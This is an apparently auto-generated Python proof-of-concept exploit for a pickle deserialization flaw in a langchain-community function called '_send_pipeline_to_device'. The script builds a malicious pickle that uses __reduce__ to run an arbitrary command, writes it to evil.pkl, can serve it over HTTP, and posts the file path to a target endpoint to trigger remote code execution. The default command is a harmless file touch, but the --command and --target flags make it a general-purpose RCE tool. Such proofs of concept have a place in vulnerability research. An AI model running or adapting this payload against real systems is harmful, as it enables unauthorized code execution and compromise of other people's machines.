#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-019
# Sink: _send_pipeline_to_device
# Auto-generated — run with: python3 rce_who_control_pipeline__send_pipeline_to_device_5.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for insecure pickle deserialization in
langchain-community-only's _send_pipeline_to_device function.

Vulnerability: The function opens a file path provided as the 'pipeline'
parameter and deserializes it with pickle.load(). An attacker who can control
this parameter can achieve remote code execution by providing a malicious
pickle file.

This PoC:
1. Creates a malicious pickle file that executes a benign command
   (touch /tmp/poc_success.txt)
2. Hosts it on a local HTTP server (or writes it to a known path)
3. Triggers the vulnerable function by calling the simulated API endpoint
   with the path to the malicious pickle file

Usage:
    python exploit.py [--target http://localhost:8000] [--payload-path /tmp/evil.pkl]
"""

import argparse
import base64
import os
import pickle
import subprocess
import sys
import tempfile
import time
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urljoin

import requests


def create_malicious_pickle(command: str) -> bytes:
    """
    Create a pickle payload that executes the given command when deserialized.
    
    Uses __reduce__ to execute a subprocess command during unpickling.
    """
    class Exploit:
        def __reduce__(self):
            return (subprocess.check_output, (command,))
    
    return pickle.dumps(Exploit())


def start_file_server(directory: str, port: int) -> HTTPServer:
    """
    Start a simple HTTP server to serve the malicious pickle file.
    Returns the server object (already started in a daemon thread).
    """
    os.chdir(directory)
    server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] File server started on port {port}")
    return server


def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community pickle deserialization RCE"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Target API endpoint (default: http://localhost:8000)"
    )
    parser.add_argument(
        "--payload-path",
        default=None,
        help="Path to write malicious pickle file (default: temp file)"
    )
    parser.add_argument(
        "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--serve-port",
        type=int,
        default=9999,
        help="Port for local file server (default: 9999)"
    )
    args = parser.parse_args()

    # Step 1: Create the malicious pickle payload
    print("[*] Creating malicious pickle payload...")
    payload = create_malicious_pickle(args.command)
    print(f"[*] Payload size: {len(payload)} bytes")

    # Step 2: Write payload to a file
    if args.payload_path:
        payload_path = args.payload_path
    else:
        # Use a temp file in a directory we control
        temp_dir = tempfile.mkdtemp(prefix="poc_")
        payload_path = os.path.join(temp_dir, "evil.pkl")
    
    with open(payload_path, "wb") as f:
        f.write(payload)
    print(f"[*] Malicious pickle written to: {payload_path}")

    # Step 3: Start a local HTTP server to serve the file (if needed)
    # The vulnerable function expects a file path, so we can either:
    # a) Write the file to a location the target can access (e.g., via upload)
    # b) Use a file:// URL or network share
    # For this PoC, we assume the target can access the local filesystem
    # where we write the file. If the target is remote, we'd need to host it.
    
    # For local testing, we just use the file path directly
    # For remote targets, we'd need to serve it via HTTP and use a file:// URL
    # or have the target download it first.
    
    # Step 4: Trigger the vulnerability
    # The simulated API endpoint is: POST /api/v1/trigger
    # with untrusted_user_input being the pipeline parameter
    target_url = urljoin(args.target, "/api/v1/trigger")
    
    print(f"[*] Sending exploit to {target_url}")
    print(f"[*] Payload path: {payload_path}")
    
    try:
        # The vulnerable function expects the pipeline parameter as a string
        # (file path). We send it as a POST parameter.
        response = requests.post(
            target_url,
            data={"untrusted_user_input": payload_path},
            timeout=10
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
    except requests.exceptions.ConnectionError:
        print("[!] Connection failed - is the target running?")
        print("[!] Try: python -m uvicorn app:app --reload")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

    # Step 5: Verify exploitation
    print("\n[*] Checking if command was executed...")
    if os.path.exists("/tmp/poc_success.txt"):
        print("[+] SUCCESS: /tmp/poc_success.txt was created!")
        print("[+] The command executed successfully via pickle deserialization.")
    else:
        print("[-] File not found - command may not have executed.")
        print("[-] Check target logs for errors.")
        # Try to verify via other means
        print("[*] Note: If target is remote, check the remote filesystem.")

    # Cleanup
    print("\n[*] Cleaning up...")
    if not args.payload_path:
        os.remove(payload_path)
        os.rmdir(os.path.dirname(payload_path))
    print("[*] Done.")


if __name__ == "__main__":
    main()
